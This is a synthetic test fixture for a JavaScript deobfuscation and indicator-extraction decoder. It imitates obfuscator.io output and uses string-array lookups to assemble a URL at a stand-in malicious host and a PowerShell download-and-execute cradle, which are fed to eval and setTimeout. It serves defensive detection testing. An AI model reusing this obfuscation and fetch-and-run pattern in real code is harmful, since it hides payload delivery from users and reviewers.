// Synthetic obfuscator.io-shaped JavaScript: the script-array literal,
// the indexer function, and a sink call whose arguments concatenate to
// a real URL and a shell command. Loupe's `js-assembly` decoder must
// resolve the eval/setTimeout payloads and surface the URL through
// `_processCommandObfuscation` -> IOC extraction.
//
// Hand-written rather than copied from a real sample so the fixture is
// safe to commit and stable across the obfuscator's release cycle.
var _0xa1b2 = [
  'http://',
  'malicious.example',
  '/payload',
  '.exe',
  'powershell',
  '-NoProfile',
  '-Command',
  'IEX',
  '(New-Object',
  ' Net.WebClient).DownloadString(',
  ');',
  'log',
  'warn',
  'error',
  'info',
  'debug',
  'trace',
  'group',
  'table',
  'dir',
];

function _0xc3d4(i) {
  return _0xa1b2[i];
}

// Sink #1: classic eval(<concat>) — recovered string is the URL.
eval(_0xc3d4(0) + _0xc3d4(1) + _0xc3d4(2) + _0xc3d4(3));

// Sink #2: setTimeout(<expr>, <ms>) — recovered string is a powershell
// download-cradle invocation. The decoder must split off the `, 100`
// delay before resolving.
setTimeout(
  _0xc3d4(4) + ' ' + _0xc3d4(5) + ' ' + _0xc3d4(6) + ' ' +
  _0xc3d4(7) + _0xc3d4(8) + _0xc3d4(9) + '"' + _0xc3d4(0) +
  _0xc3d4(1) + _0xc3d4(2) + '"' + _0xc3d4(10),
  100
);
